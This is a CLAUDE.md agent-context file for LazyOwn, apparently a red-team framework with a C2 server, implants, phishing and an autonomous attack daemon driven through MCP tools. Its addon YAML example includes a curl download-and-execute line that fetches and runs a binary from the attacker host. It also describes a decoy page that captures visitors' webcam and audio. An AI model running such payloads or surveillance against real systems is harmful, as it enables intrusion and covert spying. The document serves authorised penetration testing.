# CLAUDE.md — LazyOwn RedTeam Framework

Durable context for any Claude/agent touching this repo. Source of truth: `lazyown.py`, `lazyc2.py`, `utils.py`, `payload.json`, `skills/`, `modules/`, `templates/`.

> **Size budget:** keep this file ≤ 40 KB. Beyond that the prompt cache stops paying off and every assistant invocation pays a tax. `tests/test_claudemd_size.py` enforces the cap; if you need to add a section, trim or move long-form content into a `<dir>/README.md` and link to it from here.

---

## 0. What LazyOwn is

Professional red-team / pentest framework:
- **CLI** (`lazyown.py`): cmd2 shell, ~4,700 LOC, 606 commands + 126 aliases driven by 63 ``CommandSet`` modules under ``cli/commands/``.
- **C2** (`lazyc2.py`): Flask + Jinja2 + Socket.IO, 121 routes, 55+ templates, malleable HTTP profiles, XOR-stub Go beacon, multi-operator `/collab/`, phishing (SQLite + Groq).
- **Utils** (`utils.py`): ~138 helpers (config, ANSI, NVD/ExploitAlert/PacketStorm scrapers, ARP, certs).
- **Skills** (`skills/`): MCP server (148 tools), autonomous daemon, hive-mind, MoE+RL SWAN, parquet KB, policy engine, Groq/Ollama agents.

## 0.1 Security contracts

Each security control is a single contract in its own file. Full specs in `docs/SECURITY_CONTRACTS.md`.

| Contract | Module | Tests |
|----------|--------|-------|
| CORS allowlist | `lazyc2/security/cors.py` | `test_cors_policy.py`, `test_cors_behavior.py` |
| CSRF token gate | `lazyc2/security/csrf.py` | `test_csrf_policy.py`, `test_csrf_behavior.py` |
| `/api/run` allowlist | `lazyc2/security/command_allowlist.py` | `test_command_allowlist*.py` |
| HTTPS redirect (PROD) | `lazyc2/security/https_redirect.py` | `test_https_redirect.py` |
| Trusted proxy parser | `lazyc2/security/trusted_proxy.py` | `test_trusted_proxy.py` |
| HTML sanitizer (bleach) | `lazyc2/security/html_sanitizer.py` | `test_html_sanitizer.py` |
| Safe subprocess runner | `core/safe_subprocess.py` | `test_safe_subprocess*.py` |
| AES key resolution | `core/config.py` | `test_aes_key_propagation.py` |
| Secret/AES/file services + validators | `lazyc2/security/{services,validators}.py` | `test_security_lazyc2.py` |

## 0.2 Non-negotiable: user input is hostile

**Every byte of user-controlled input MUST be treated as malicious — no exceptions, ever.**

This is not a guideline. It is the single most important security rule in this codebase.

| Rule | What it means |
|------|---------------|
| Never trust user input | Every `request.args`, `request.form`, `request.json`, `request.headers`, `request.cookies`, route parameter, `sys.argv`, `input()`, file upload name, and any other external input is assumed to be a deliberate attack until proven otherwise. |
| Sanitize before use | User input must be sanitized *before* it touches any filesystem path, SQL query, shell command, system call, template render, or serialization. No exceptions, not even for "internal" or "trusted" endpoints. |
| Path traversal is the #1 vector | Any user input that ends up in `os.path.join`, `open()`, or any filesystem operation MUST go through a whitelist character filter AND an `os.path.realpath` prefix check against an explicit allowed directory. Even a single character of uncontrolled path input is unacceptable. |
| Defense in depth | A sanitization function is not enough. Always add a second layer: `os.path.realpath()` + `.startswith(allowed_dir + os.sep)` before any file I/O. If the path does not resolve within the allowed directory, reject with 403. |
| Log and reject | When user input fails validation, log the rejection event and return a generic error. Never reflect the rejected input back to the user (information leak). |
| CodeQL path-expression alerts are blockers | Any CodeQL "Uncontrolled data used in path expression" alert is a critical security bug and must be fixed before merge. No exceptions, no suppressions. |

### Implementation pattern

```python
import os

def safe_path(user_input: str, allowed_dir: str, prefix: str = "") -> str:
    sanitized = ''.join(c for c in str(user_input) if c.isalnum() or c in '-_.')
    if not sanitized:
        raise ValueError("Invalid input")
    allowed = os.path.realpath(allowed_dir)
    candidate = os.path.realpath(os.path.join(allowed, f"{prefix}{sanitized}"))
    if not candidate.startswith(allowed + os.sep):
        raise PermissionError("Path traversal blocked")
    return candidate
```

This pattern MUST be used whenever user input contributes to a filesystem path. Copy-paste it. Do not "improve" it without peer review.

### C2 Transport & Evasion contracts

Each module is a single-file contract for one transport or evasion concern. All ship with 94%+ mutation-killed coverage.

| Contract | Module | Tests |
|----------|--------|-------|
| Extended malleable C2 (TLS, DNS, SMB, WebSocket) | `modules/c2_profile_engine.py` | `test_c2_profile_engine.py` |
| BOF catalog, marketplace, registry | `modules/bof_registry.py` | `test_bof_registry.py` |
| Sleep obfuscation engine (9 techniques) | `modules/sleep_obfuscation.py` | `test_sleep_obfuscation.py` |
| SOCKS5 proxy spec engine | `modules/socks_proxy.py` | `test_socks_proxy.py` |
| HTTP malleable profiles (base) | `modules/c2_profile.py` | (built-in CLI) |

Compat: PROD fail-fast on missing C2 keys, DEV warn-and-default. AES key is `payload.json:aes_key` (64 hex) → `self.aes_key` (bytes) + `self.params['aes_key']` (hex). Lazyaddons use `{{aes_key}}` or `{aes_key}` for substitution.
- **Extensions**: `lazyaddons/*.yaml` (declarative tools), `plugins/*.lua` (lupa), `tools/*.tool` (pwntomate auto-jobs).
- **lazyaddons**: `lazyaddons/*.yaml` — extendthe framework with yamls.

MCP sits on top and exposes `lazyown_*` tools to Claude Code.

---

## 1. Entry points

```sh
./run [--no-banner] [-s] [-p sessions/foo.json] [-c 'cmd']   # cmd2 shell
bash fast_run_as_r00t.sh --no-attach --vpn 1                 # full stack in tmux 'lazyown_sessions'
claude mcp add lazyown python3 /home/grisun0/LazyOwn/skills/lazyown_mcp.py
bash skills/mcp_restart.sh                                   # after editing MCP code
```

- `./run` activates `env/` venv then runs `python3 -W ignore lazyown.py`.
- **Only** `lazyown.py` is launched directly; other Python files are imported / executed via `do_run` / called from MCP / spawned by daemon.
- `fast_run_as_r00t.sh` runs as root: starts C2 on `lhost:c2_port` w/ self-signed TLS, nmap recon, auto-loop. `sleep_start` (default `333`s, see `payload.json`) **must** elapse before first loop fire — never timeout below it.

---

## 2. Repo map

| Path | Role |
|------|------|
| `lazyown.py` | cmd2 shell `LazyOwnShell(cmd2.Cmd)`; CLI skeleton + startup hooks. Commands in ``cli/commands/``. |
| `lazyc2.py` | Flask + Socket.IO C2, decoy site, phishing bp, dashboard, /pty xterm. |
| `utils.py` | Shared helpers + `Config`, `VulnerabilityScanner`, `MyServer`, `IP2ASN`. |
| `payload.json` | **Only** runtime config. Read by every component. |
| `templates/` | 55+ Jinja2; extend `base.html`. Subdirs: `phishing/`, `landing_pages/`, `emails/`. |
| `static/` | CSS/JS (xterm.js, particles.js), icons, `body_report.json`. |
| `modules/` | 65+ modules: LLM clients, `collab_bp`, `dashboard_bp`, world model, playbook engine. |
| `modules/integrations/` | MISP export, Nuclei, Searchsploit. |
| `modules/backdoor/` `modules/rootkit/` `modules/win_rootkit/` | C/C++/C# implants & rootkits. |
| `skills/` | MCP server + autonomous daemon + hive_mind + swan + policy + parquet_db. |
| `sessions/` | Campaign state — **gitignored**, never delete w/o confirmation. `git add -f` to stage. |
| `parquets/` | Columnar KBs: GTFOBins, LOLBas, MITRE ATT&CK (6 `.parquet`). |
| `plugins/` | Lua plugins (lupa). Each `.lua` + `.yaml` metadata. |
| `lazyaddons/` | 124 YAML tool integrations. Auto-discovered. |
| `tools/` | 69 pwntomate `.tool` files; auto-trigger on nmap services. |
| `external/` `modules_ext/` `vpn/` | **Gitignored**; `git add -f` required. Never commit creds. |
| `lazyscripts/` `playbooks/` `lazyadversaries/` | `.ls` recipes, YAML APT playbooks (7 actors), threat profiles. |
| `cli/` | Shell extensions: wizard, graph advisor, reactive hints, dashboard TUI, palette. Zero imports from `lazyown.py`. |
| `cli/commands/` | cmd2 `CommandSet` subpkg, auto-discovered by `cli/registry.py`. |
| `core/` | Canonical `Config`, crypto, validators, `typing.Protocol` interfaces. No framework imports. |
| `scripts/` | Build/maintenance: `build_command_index.py`, `patch_playbook_atomic_ids.py`. |
| `tests/` | 111 files |
| `lazyown-docker/` `lazygui/` | Docker + desktop GUI. |
| `docs/` | GH Pages site — auto-generated by `DEPLOY.sh`, don't edit HTML. |
| `lazyc2/` | Security validators (`validate_route_path`, `validate_template_name`, `is_safe_template_path`). |
| `banners/` `source/` | Banner / artwork. |
| `QUICKSTART.md` | Canonical 5-min onboarding. Manual; update when operator flow changes. |

**Every directory has a `README.md`.** Create one immediately when adding a new dir. Rules per §10: English-only, no emojis, file/subdir table, "How it works" + "Adding X" sections, no generated content.

---

## 3. `payload.json` — single config source

Loaded by `core.config.load_payload()`, wrapped by `class Config` (`core/config.py`). Every component reads here. **Nothing hardcoded; nothing duplicated; if reused → goes here.**

Typed shape lives in `core/payload_schema.py` (`SCHEMA`): every well-known key has a `FieldSpec` (kind, default, description, example, sensitive flag, required flag). Use `validate_payload(data)` for non-fatal issue reports, `validate_value(key, value)` for single-field checks and `coerce_value(key, raw)` for safe casts (`"5555"` → `5555` for ports, `"true"` → `True` for bools). Adding a new well-known key means adding the `FieldSpec` here — the wizard, the `assign` command and the readiness report pick it up automatically.

Critical keys:

| Key | Purpose |
|-----|---------|
| `rhost`, `lhost`, `rport`, `lport` | Target/attacker IPs+ports |
| `c2_port`, `c2_user`, `c2_pass` | C2 socket + basic auth |
| `domain`, `subdomain`, `os_id` | Target context (os_id 1=lin/2=win) |
| `start_user`, `start_pass` | Initial creds (auto-injected on discovery) |
| `wordlist`, `usrwordlist`, `dirwordlist`, `dnswordlist`, `iiswordlist` | SecLists paths |
| `c2_malleable_route` | Beacon URI prefix (default `/pleasesubscribe/v1/users/`) |
| `user_agent_*`, `url_traffic_*` | Malleable C2 profile |
| `sleep`, `sleep_start` | Beacon jitter + auto-loop bootstrap delay |
| `api_key` | Groq (used by `report.py`, AI agents) |
| `enable_telegram_c2`/`discord_c2`/`ia`/`deepseek`/`cloudflare`/`run_in_memory`/`c2_implant_debug`/`c2_debug` | Feature flags |
| `llm_backend` | LLM selection: `"auto"` (Groq when API key is set, else Ollama), `"groq"`, or `"ollama"` |
| `llm_model_groq` | Model identifier passed to the Groq API (default `llama-3.3-70b-versatile`) |
| `llm_model_ollama` | Model identifier passed to the Ollama API (default `deepseek-r1:1.5b`) |
| `ollama_host` | Base URL of the Ollama daemon (default `http://localhost:11434`) |
| `llm_daily_budget_usd` | Daily cost cap the LLM budget proxy enforces (default `1.0`) |
| `llm_per_call_token_cap` | Per call input token cap the proxy enforces (default `8000`) |
| `llm_budget_enabled` | When `false` the proxy passes calls through without recording (default `true`) |
| `llm_reset_at_utc` | UTC time the ledger rolls over (default `00:00`) |
| `llm_model_prices` | Per model price table expressed in United States dollars per million tokens |
| `c2_daily_limit`, `c2_hour_limit`, `c2_login_limit` | flask-limiter strings |
| `targets` | Multi-target list (status, ports, tags, notes) |
| `scope` | Authorized engagement scope: list of CIDR/IP/hostname entries (`*.` wildcards). Empty = scope guard dormant |
| `scope_enforcement` | Scope guard posture: `off` (disabled), `warn` (annotate, default), `enforce` (block out-of-scope offensive commands) |
| `rat_key` | XOR key for stub/beacon |
| `device`, `startip`, `endip` | Net discovery range |

**Read/write:**
- CLI in-process: `self.params[key]` (saved back via `do_assign`/`do_set`).
- External: `from utils import Config, load_payload; cfg = Config(load_payload())`.
- MCP: `lazyown_get_config()` / `lazyown_set_config(key, value)`.

Cross-process state → must go through `payload.json`. Don't invent JSON files unless a genuinely different domain (e.g. `sessions/world_model.json`, `tasks.json`, `objectives.jsonl`).

---

## 4. Architecture

```
operator/Claude ──► ./run ─► lazyown.py (cmd2)
                ──► MCP   ─► skills/lazyown_mcp.py (~131 fns) ─► skills/{daemon,hive_mind,swan,policy,parquet_db}
                ──► Web   ─► lazyc2.py (Flask+SocketIO+Jinja2, /pty, DNS)
                                        │
                       all ──► utils.py (Config, run_command, …) ──► payload.json
                                        │
                                  sessions/ · parquets/ · templates/ · modules/ · plugins/ · lazyaddons/ · tools/
```

CLI and C2 both import `utils.py` + read `payload.json`. MCP reuses `LazyOwnShell` — no second CLI implementation.

---

## 5. CLI conventions (`lazyown.py`)

- One class `LazyOwnShell(cmd2.Cmd)`. Subclass `CommandSet` only when meaningfully orthogonal.
- Methods `do_<name>(self, line)`; docstring = `help <name>`.
- Args: `@with_argparser(parser)` for non-trivial; `@with_argument_list` for simple split.
- `@with_category('Recon')` etc. — keep existing names.
- Aliases: `aliases` dict at class level; payload-derived aliases use class-body `f""` (refresh on shell restart).
- `self.params` mirrors `payload.json`. Write back via `do_assign`/`do_set` only.

### Adding a command — happy path
1. Place near related commands in right category.
2. Read inputs from `self.params` — never accept `rhost`/`lhost`/etc. as positional when in payload.
3. Validate with `check_rhost`/`check_lhost`/`check_lport` (utils).
4. Execute via `run_command(cmd_str)` — captures output, strips ANSI, CSV-logs.
5. Artefacts → `sessions/...` with stable filenames.
6. Add **one** natural short alias (or none).
7. MCP exposes every `do_*` via `lazyown_run_command` automatically.
8. If new command has a phase, add to bridge catalog (`modules/c2_profile.py` or wherever `BridgeSelector` reads) so auto-loop sees it.

### Sad paths
- Missing payload key → `check_rhost(...)` returns False → `print_error` + `return` (don't raise).
- External binary missing → guard with `is_binary_present(name)`, `print_warn` w/ install instructions, don't fall back silently.
- Long-running tool → never timeout below documented runtime (e.g. `lazynmap` ≥ 30 min); detach via `subprocess.Popen`, `print_msg` w/ artefact path.
- OS mismatch → read `sessions/os.json` or `payload.json["os_id"]`; refuse Linux-only against Windows (daemon already enforces).
- Sensitive output → never print secrets; write to `sessions/credentials*.txt` / `hash*.txt`.

### Do NOT
- Import `lazyc2` from CLI — CLI must run without Flask.
- Write to `payload.json` outside `do_assign` / `do_set` / `lazyown_set_config` / `auto_populate` / `do_scope` (race condition).
- Hardcode wordlist/port/IP — use `self.params`.
- Introduce new `print_*` style — use `print_msg`/`print_warn`/`print_error`.

### Scope guard
Every interactive command flows through `LazyOwnShell.onecmd_plus_hooks`, which calls `_scope_check` before dispatch. Offensive commands (kill-chain categories 01–09 + Pwntomate + Adversary, see `cli/scope_guard.OFFENSIVE_CATEGORIES`) targeting an out-of-scope `rhost` are warned (`warn`) or blocked (`enforce`). The guard is **fail-open**: dormant while `scope` is empty or `scope_enforcement` is `off`, and any internal error allows the command. Manage it with the `scope` verb. When you add a `do_*` in an offensive category it is auto-classified — no extra wiring.

---

## 6. C2 (`lazyc2.py`)

- `app = Flask(__name__, static_folder='static')` (~line 1610).
- `socketio = SocketIO(app, async_mode='threading', transports=['websocket'])`; namespaces `/listener`, `/pty`, `/terminal`.
- `flask-limiter` from `c2_daily_limit`/`c2_hour_limit`/`c2_login_limit`.
- 84 routes: landing/dashboard, malleable beacon protocol (`/command/<id>`, `<route_malleable><id>`), uploads, short-URL beacons, phishing, terminal/PTY, surface graph, Bloodhound zip, AI bots, JSON dashboard at `/api/dashboard`.
- Blueprints: `phishing_bp`, `dashboard_bp` (`/dashboard`), `collab_bp` (`/collab`).
- **Blueprint config pattern**: `lazyc2.py` sets `app.config["LAZYOWN_CONFIG"] = config` before `register_blueprint`. Blueprint reads via `current_app.config.get("LAZYOWN_CONFIG")` — do NOT pass module globals.
- Auth: HTTP Basic via `requires_auth` (uses `c2_user`/`c2_pass`) + `flask-login` for operator UI.
- DNS server: `dnslib` resolver in daemon thread.
- Watcher: `watchdog.Observer` reading `event_config.json`.

### Adding a route — happy path
1. Decide operator-only (`@requires_auth`) vs beacon-facing (apply both canonical path AND `f'{route_malleable}<...>'` alias).
2. `render_template('foo.html', ctx=...)` — typed context, not raw request data.
3. Validate paths/templates with `validate_route_path` + `validate_template_name` + `is_safe_template_path`. Never bypass. The canonical implementations live in `lazyc2/security/validators.py` (return `(bool, str)` tuples). Module-level shims in `lazyc2.py` wrap them as booleans for legacy callers — new code must consume the tuple form so the error string can be surfaced to the operator.
4. Persist via existing helpers:
   - JSON: `load_routes`/`save_routes`, `load_short_urls`, etc. — atomic (`*.tmp` → `os.rename`, chmod 600).
   - SQLite: `sqlite3.connect(DB_PATH)` inside `with` blocks.
5. Log to `sessions/access.log` via `logger = logging.getLogger(__name__)`.
6. Reuse existing Socket.IO namespaces.
7. New Jinja2 → `templates/`, extend `base.html`, reuse `header.html`/`nav.html`/`footer.html`.

### Sad paths
- Path traversal → always `is_safe_template_path` first; reject paths escaping `templates/`.
- CSRF/auth bypass → beacon routes accept POST without CSRF (implants don't carry tokens), but operator mutations require auth + session cookie.
- Decoy fall-through → non-`127.0.0.1`/`lhost` IPs hit `decoy()` → renders `decoy.html` (fake landing, captures webcam/audio). Never break this — operator routes must check auth AND origin.
- Hardcoded ports → bind to `lport`/`c2_port` only.
- TLS → `cert.pem`/`key.pem` from `gen_cert.sh`; always HTTPS in PROD.
- Phishing routes → register on `phishing_bp` (template_folder `templates/phishing`), not `app`.

### Template rules
- Extend `base.html`, `{% include %}` partials.
- Mark `|safe` only when you produced the HTML.
- Filenames match `validate_template_name`: `^[a-zA-Z0-9_-]+\.html$`.

---

## 7. `utils.py`

Only module both CLI and C2 import. Use existing helpers:

| Need | Use |
|------|-----|
| Read `payload.json` | `load_payload()` → `Config(...)` |
| ANSI output | `print_msg`/`print_warn`/`print_error` |
| Shell + capture | `run_command(cmd)` |
| XOR | `xor_encrypt_decrypt(data, key)` |
| Self-signed TLS | `generate_certificates()` |
| Exploit search | `find_ss`/`find_ea`/`find_ps`/`nvddb`/`exploitalert`/`packetstormsecurity` |
| HTTP req | `generate_http_req(host, port, uri, ...)` |
| Input validation | `check_rhost`/`check_lhost`/`check_lport` |
| Binary present? | `is_binary_present(name)` — `shutil.which` based, no shell |
| Optional heavy dep | `from core.dependencies import optional_import, optional_attr` — bind lazily so a missing package degrades one feature, not the whole framework |
| Tmux bootstrap | `ensure_tmux_session(name)` |
| Emails/users/creds | `generate_emails`/`get_users_dic`/`crack_password` |
| Vulnerability scan + persist | `VulnerabilityScanner().search_cves(service)` → `.persist(service, target, cves)` writes `sessions/vulns_<target>.json` |
| LLM backend | `from modules.llm_factory import get_llm_backend, try_get_llm_backend` — reads `llm_backend`/`llm_model_*`/`ollama_host` from `payload.json` and returns an `AIModel` that also structurally satisfies `core.protocols.LLMBackend` |

New helpers go here only if shared CLI↔C2. Feature-local helpers → `modules/<feature>.py`.

**LLM backends**: do **not** instantiate `GroqModel`/`OllamaModel` directly. Use `from modules.llm_factory import get_llm_backend` (raises) or `try_get_llm_backend` (returns `None` on failure). The factory reads `llm_backend`, `llm_model_groq`, `llm_model_ollama`, and `ollama_host` from `payload.json`, so swapping providers never requires a code change. Callers that pass an explicit `provider` argument should translate the legacy `groq`/`deepseek` identifiers via the `_PROVIDER_ALIAS` mapping declared next to each call site.

---

## 8. MCP — `skills/lazyown_mcp.py`

~131 tools. **Never re-implements** CLI/C2 — imports `LazyOwnShell` or composes shell + REST + file reads.

### Adding a tool — happy path
1. Functionality must exist as `do_*` / utils helper / C2 endpoint first.
2. Name `lazyown_<verb>_<noun>` (e.g. `lazyown_get_config`).
3. Document params via JSONSchema; mark required/optional explicitly.
4. Return structured JSON (objects/lists), not prose.
5. Run `bash skills/mcp_restart.sh` after editing.

### Sad paths
- Name collision → MCP discovers addons (`lazyaddons/*.yaml`), plugins (`plugins/*.lua`), `.tool` files at startup. Prefix unambiguously.
- Long-running → detach + return; add `*_status` poll tool.
- Never cache `payload.json` across calls — operator may have changed it via CLI.

---

## 9. `sessions/` — authoritative campaign state

**Only** durable cross-process location. Never delete without operator confirmation.

| File | Producer | Consumer |
|------|----------|----------|
| `scan_<rhost>.nmap[.xml]` | `do_lazynmap` | autonomous_daemon, pwntomate, FactStore |
| `vulns_<rhost>.nmap` | `do_lazynmap` (vuln scripts) | reactive_engine |
| `<ip>/<port>/<tool>/*.txt` | pwntomate | bridge_suggest, threat_model |
| `logs/command_<tool>output<domain>.txt` | run_command CSV logger | facts_show |
| `LazyOwn_session_report.csv` | every command | timeline_narrator, threat_model |
| `credentials*.txt`, `hash*.txt` | reactive_engine, do_responder | later phases |
| `vulns_<rhost>.json` | `do_vulns` via `utils.VulnerabilityScanner.persist` | `get_target_context`, reactive_engine, report generator |
| `world_model.json` | autonomous_daemon | session_state, recommend_next |
| `tasks.json` | campaign_tasks | sitrep, dashboard |
| `objectives.jsonl` | inject_objective | autonomous_daemon |
| `sessionLazyOwn.json` | shutdown/handoff | sitrep, c2_notes |
| `os.json` | do_ping, beacon ground truth | every selector |
| `events.jsonl`, `autonomous_events.jsonl` | event_engine, daemon | poll_events |
| `campaign_lessons.jsonl` | EpisodeReflectionEngine | next campaign |
| `policy_facts.json` | policy engine | dashboard |
| `captured_images/` | decoy site | operator review |
| `keyword_fallback_index.json` | rag fallback (no ChromaDB) | rag_query |
| `blacksandbeacon` | `blacksandbeacon` addon (`make`) | collab_join delivery |

Before any tool: (1) `ls sessions/`, (2) read existing artefacts. If answer exists, don't re-scan.

---

## 10. Coding standards (enforced by review)

1. **English only.** Identifiers, strings, logs, docstrings. Translate Spanish remnants when you touch them.
2. **No comments.** Self-explanatory names + docstrings. Single-line note OK for non-obvious constraint or CVE ref.
3. **No emojis** in code/logs/docs unless operator asked. Banner ASCII art OK.
4. **Docstrings on every public function/class**:
   ```python
   def foo(bar: str) -> dict:
       """One-line summary.

       Args:
           bar: …
       Returns:
           …
       Raises:
           …
       """
   ```
5. **No magic numbers** — constants in `class Config` (shared) or `UPPER_SNAKE_CASE` module-level.
6. **No hardcoded paths/ports/IPs/wordlists/creds** — `payload.json` if reused, module constant if local.
7. **SOLID**:
   - **S**: one reason to change per class/fn.
   - **O**: extend via new addon/MCP tool/selector — don't edit hot paths.
   - **L**: new selector honours `BaseSelector.suggest()` contract.
   - **I**: small role-specific protocols (recon/exploit/cred/lateral/privesc).
   - **D**: orchestration depends on `LLMBackend`/`MemoryStore`/`Selector` abstractions, not Groq/ChromaDB directly.
8. **Consistency beats novelty** — when two patterns fit, pick the one already used.
9. **No partial implementations** — end-to-end (CLI ↔ payload.json ↔ MCP ↔ `sessions/` artefact) or not merged.
10. **No backwards-compat shims** for unshipped code — just change it.
11. **Every new directory gets a README** (see §2 rules). No exceptions.
12. **Boy-scout law (tech debt).** When a fix / refactor / new feature uncovers tech debt or a vulnerability that can be addressed **without breaking public surface or shipped behaviour**, address it in the same change and call it out in the PR body. Plan with `/graphify` first so the blast radius is understood — never refactor blindly. If the cleanup is unsafe within the change, open a follow-up task; do **not** silently leave the broken window.
13. **Smart consolidation (DRY+SOLID).** When two or more code paths duplicate logic (~10 LOC or one decision tree), consolidate into a single class/function honouring SOLID. Shared values go to `class Config` / `payload.json` if globally reused, module-level `UPPER_SNAKE_CASE` if local. Refactor must keep every existing call site working and ship with tests that pin behaviour **before** the move. No silent simplifications — feature parity is mandatory.
14. **Tests trend to 100%.** Every change ships with tests. If a touched module gains testable code, the change must raise coverage, not lower it. `pytest -q` must stay green. No `skip` / `xfail` without an issue link in the same PR.
15. **Docs follow code.** When a public surface (CLI verb, MCP tool, payload key, blueprint route, addon schema) is added or renamed, update the matching `docs/<topic>.md` and regenerate `COMMANDS.md` / `UTILS.md` via `python3 readmeneitor.py lazyown.py` and `python3 readmeneitor.py utils.py`. Missing or empty docstrings on new public API block merge. Extend `readmeneitor.py` itself when a new source file deserves auto-generated reference docs.

---

## 11. Spec-driven discipline (in commit/PR body, not code)

**Happy path**: trigger? inputs (payload keys/CLI args/MCP params)? success outcome (`sessions/` file / event / return value)? operator-visible signal?

**Sad paths** (≥ 6 considered per change):
- Required payload key missing/empty.
- External binary or wordlist absent.
- Network unreachable / timeout / TLS error.
- Target OS mismatch.
- Output already exists in `sessions/` — must not redo destructive work.
- Concurrent writer (CLI + daemon).
- AV/EDR detected → reactive_engine raises `escalate_evasion`.
- SIGINT → `signal_handler` cleans tmux/sockets.
- Long-running tool exceeds runtime — never auto-kill, log + continue.
- Phishing template/route name fails validation → re-render form w/ flash error, never `500`.

If a sad path has no defensive code, justify explicitly (e.g. "trusted internal call from `do_assign`, validated upstream").

---

## 12. Agent prompt/context engineering

When invoking Claude/Groq/Ollama (`lazyown_llm_ask`, `swan_run`, `hive_spawn`, `groq_agent`):

1. **System prompt** — persona from `sessions/soul.md` (canonical). Include hard stops (PII, customer-of-customer, destructive ops).
2. **Context window** — only what changes next decision:
   - Current phase (`world_model.json`).
   - Last 3 commands+outputs (`LazyOwn_session_report.csv`).
   - Top-3 pivot candidates (`world_model.NetworkGraph.centrality()`).
   - Active objective (`objectives.jsonl`).
   - Relevant captured creds.
3. **Tool catalogue** — filter bridge catalog to current phase + OS, never all 362 commands.
4. **Output contract** — request `{"command": "...", "reasoning": "...", "mitre": "Txxx"}`. Reject prose.
5. **Reward shaping** — Detection Oracle + OutcomeEvaluator score each step → propagated to RL Q-table + MoE weights. New selectors emit reward `∈ [0, 1]`.

`sessions/soul.md` = only persistent persona/policy file. Update via `lazyown_soul(action="write", content=...)`.

---

## 13. Pick the right extension surface

| Goal | Surface |
|------|---------|
| Wrap existing GitHub tool | `lazyaddons/<name>.yaml` |
| One-liner / payload generator | `plugins/<name>.lua` |
| Auto-run on discovered service | `tools/<name>.tool` |
| New CLI command | `do_<name>` in `lazyown.py` |
| New web UI page / beacon endpoint | `lazyc2.py` route + Jinja2 |
| New Flask blueprint | `modules/<name>_bp.py` + register in `lazyc2.py`; config via `app.config["LAZYOWN_CONFIG"]` |
| New MCP tool | `skills/lazyown_mcp.py` |
| New autonomous selector | subclass `BaseSelector` in `skills/autonomous_daemon.py` |
| New AI agent persona | `skills/lazyown_groq_agents.py` registry |
| New LLM backend | implement `AIModel` in `modules/ai_model.py`, register identifier in `modules/llm_factory.SUPPORTED_BACKENDS`, expose via the `_PROVIDER_ALIAS` mapping when callers need the legacy `groq`/`deepseek` identifiers |
| New knowledge base | new parquet + `lazyown_parquet_query` mode |
| New directory | create + `README.md` immediately |

Adding `do_*` for something that works as a YAML addon = smell.

**Blueprint `template_folder` pattern**:
```python
bp = Blueprint("name", __name__, template_folder="../templates")
```
Resolves `render_template("foo.html")` against root `templates/`. Don't duplicate into `modules/templates/`.

---

## 14. Things this framework deliberately does NOT do

- Detection evasion as primary feature (only in authorized engagements).
- Persist secrets in git (`cert.pem`, `key.pem`, `api_key`, `sessions/credentials*`).
- Run on Windows as host (`lazyown.py` exits if `os.name == 'nt'`). Linux/macOS operator targeting Linux/Win victims.
- Mock C2 or daemon in tests — integration tests run against `sessions/` fixtures.

---

## 15. Quick MCP cheatsheet

```
lazyown_session_init() / lazyown_campaign_sitrep()
lazyown_set_config(key="rhost", value="10.10.11.5")
lazyown_phase_guide(phase="recon")
lazyown_run_command("lazynmap")
lazyown_auto_populate(target="10.10.11.5")
lazyown_facts_show(target="10.10.11.5", refresh=True)
lazyown_searchsploit(query="<service> <version>")
lazyown_parquet_query(mode="context", phase="enum", target="...")
lazyown_rag_query(query="…", n=5)
lazyown_reactive_suggest(output="<raw>", command="<verb>", platform="linux")
lazyown_auto_loop(target="...", max_steps=10)
lazyown_autonomous_start(max_steps_per_objective=15)
lazyown_swan_ensemble(task_type="…", task="…", phase="…")
lazyown_hive_spawn(goal="…", n_drones=4, roles=["recon","exploit","cred","lateral"])
lazyown_generate_report(target="...", include_timeline=True)
lazyown_report_update(action="auto_fill")
lazyown_misp_export()
# CLI: collab_join <handle> [--curl]
# CLI: explore [target]                   — coverage tree + trigger-matched addons/tools
```

---

## 15a. Graph-aware navigation

Self-knowledge graph at `graphify-out/graph_lazyown.json`. Built by `/graphify`. Consumed by `cli/graph_advisor.py` (tested in `tests/test_graph_advisor.py`). Live counts live in `lazyown_graph_summary` (MCP) or `graph_search` / `god_nodes` (CLI). Treat as advisory: if `summary()['health']` is `stale` or `empty`, run `/graphify . --update` before relying on neighbours/suggestions.

**CLI**: `graph_search <q> [n]`, `neighbors <node> [depth] [n]`, `god_nodes [N]`, `suggest_next [seeds...] [N]` (no seeds → reads `sessions/LazyOwn_session_report.csv`). Shell `default()` uses advisor for "did you mean…?".

**MCP**: `lazyown_graph_summary`, `lazyown_graph_search`, `lazyown_graph_neighbors`, `lazyown_graph_suggest_next`. All accept `budget_tokens` (default 1500). Missing graph → `{"available": false, "reason": "..."}`.

**Refresh**: `/graphify .` (full) or `/graphify . --update` (incremental). Advisor caches by `(path, mtime)` — picked up on next call, no restart needed.

---

## 15b. Operator UX

### Inline reactive hints — `cli/reactive_hints.py`
`register_postcmd_hook` prints one dim line after each `do_*`:
```
  ↳ do_gobuster · do_enum4linux · do_ffuf
```
- Suggestions from `GraphAdvisor.suggest_next()`.
- `SKIP_COMMANDS` (help/exit/dashboard/set/palette/…) never produce hints.
- Toggle: `enable_inline_hints` in `payload.json` (default `true`).
- Missing graph → no-op. Latency < 1 ms after first load.
- Public surface: `render_inline_hints(advisor, last_command, limit, enabled)`. Output via `rich.console.Console`. Hook returns `data` unchanged (cmd2 passes `PostcommandData` by reference).

### Dashboard TUI — `cli/dashboard_tui.py`
`dashboard` cmd launches Textual app (blocking, **Q** quits). `LazyOwnDashboard(App)` accepts `payload_path` + `sessions_dir`. Widgets: `TargetPanel` → `KillChainPanel` + `ConfigPanel` → `CommandsPanel` → `OpsPanel` → `HintBar`. `_do_refresh()` on mount + every `REFRESH_INTERVAL` (5s) via `set_interval`. Entry: `launch(payload_path, sessions_dir)`. Requires `pip install textual`.

Pure helpers (tested independently): `_read_json`, `_read_recent_commands`, `_count_lines_in_glob`, `_beacon_count`, `_graph_hints`.

---


### Addon YAML pattern
```yaml
os: linux                  # MITRE platform (any|linux|windows|macos|network|containers|saas|iaas)
trigger: [microsoft-ds]    # nmap service names that auto-suggest this addon; [] = manual only
tool:
  install_command: make
  execute_command: git restore . ; git pull ; make && cp <binary> ../../../sessions/<binary>
  lazycommand: curl -sk "http://{lhost}:{lport}/<binary>" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &
```
Rules: always `git restore . ; git pull` before `make`; stage to `sessions/<binary>`; use `{lhost}`/`{lport}` placeholders; never hardcode. `os` defaults to `any`, `trigger` to `[]` — fill them so `explore`/`recommend_next`/`suggest_next` can surface the addon against discovered services.

Tests: `tests/test_blacksandbeacon_addon.py` (59 tests — YAML structure, required fields, path safety, template placeholders, no hardcoded IPs/ports).

---

